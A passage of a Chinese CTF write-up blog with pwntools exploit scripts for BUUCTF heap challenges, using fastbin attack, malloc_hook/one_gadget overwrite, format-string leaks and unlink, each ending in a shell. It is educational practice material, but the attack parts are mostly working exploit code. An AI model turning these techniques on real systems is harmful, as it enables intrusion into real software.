data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Size:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Data:'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x4f8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    mal<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">0x440</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2 (1)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>ma_ <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>mh_a <span class=\"token operator\">=</span> ma_<span class=\"token operator\">-</span><span class=\"token number\">96</span> <span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'mallochook:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>mh_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span> mh_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mh_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'base:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>oglist <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x4f2c5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4f322</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10a38c</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>onegadget <span class=\"token operator\">=</span> oglist<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libcbase</pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>mh_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>onegadget<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Size:'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>suspend<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"hgame2018_flag_server\"><a class=\"markdownIt-Anchor\" href=\"#hgame2018_flag_server\">#</a> hgame2018_flag_server</h1>\n<p>ctypes 导入，直接同步算得随机值。</p>\n<h1 id=\"bsidescf-2019runit\"><a class=\"markdownIt-Anchor\" href=\"#bsidescf-2019runit\">#</a> [BSidesCF 2019]Runit</h1>\n<p>基础 shellcode</p>\n<h1 id=\"gyctf_2020_some_thing_interesting\"><a class=\"markdownIt-Anchor\" href=\"#gyctf_2020_some_thing_interesting\">#</a> gyctf_2020_some_thing_interesting</h1>\n<p>** 考点：**fastbin attack, malloc_hook, fmtstr</p>\n<p>开局有一次利用格式化字符串漏洞的机会，不过必须保证输入的前几位为指定字符串，否则会直接退出。因此只有 5 个字符可供利用，刚好泄露一个 libc 地址。</p>\n<p>然后利用 0x7f 在 malloc_hook 附近分配 chunk，修改其为 one_gadget。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'gyctf_2020_some_thing_interesting'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29877</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *$rebase(0x15BA)'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'do :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size1<span class=\"token punctuation\">,</span> size2<span class=\"token punctuation\">,</span> content1<span class=\"token operator\">=</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">,</span>  content2<span class=\"token operator\">=</span><span class=\"token string\">b'bbbb'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'length : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'O : '</span><span class=\"token punctuation\">,</span> content1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'length : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'RE : '</span><span class=\"token punctuation\">,</span> content2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'ID : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content1<span class=\"token punctuation\">,</span> content2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'ID : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'O : '</span><span class=\"token punctuation\">,</span> content1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'RE : '</span><span class=\"token punctuation\">,</span> content2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'ID : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>checkstr <span class=\"token operator\">=</span> <span class=\"token string\">b'OreOOrereOOreO'</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'please:'</span><span class=\"token punctuation\">,</span> checkstr<span class=\"token operator\">+</span><span class=\"token string\">b'%17$p'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>checkstr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">240</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>mh_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>oglist <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x45216</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4526a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf02a4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf1147</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>onegadget <span class=\"token operator\">=</span> oglist<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libcbase</pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>mh_a<span class=\"token operator\">-</span><span class=\"token number\">0x23</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'hahahaha'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token number\">0x13</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>onegadget<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'length : '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"zctf_2016_note3\"><a class=\"markdownIt-Anchor\" href=\"#zctf_2016_note3\">#</a> zctf_2016_note3</h1>\n<p>** 考点：** 条件判断漏洞，unlink</p>\n<p>** 版本：**libc6_2.23 amd64</p>\n<p>保护只开了 nx 和 canary，程序的地址可利用。</p>\n<p>输入函数存在漏洞，当传入的大小为 0 时，size-1 会被判为无限大，从而可以实现任意长度输入。</p>\n<p>利用该漏洞覆盖 size 的 inuse 部分，构造 unlink。</p>\n<p>由于 <code>malloc(0)</code>  默认分配 0x20 的 chunk，而 unlink 所需的两个 chunk 至少要容纳 6 个字长，因此将 0x20 的 chunk 放在大 chunk 之间或者前面均可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'zctf_2016_note3'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29786</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td 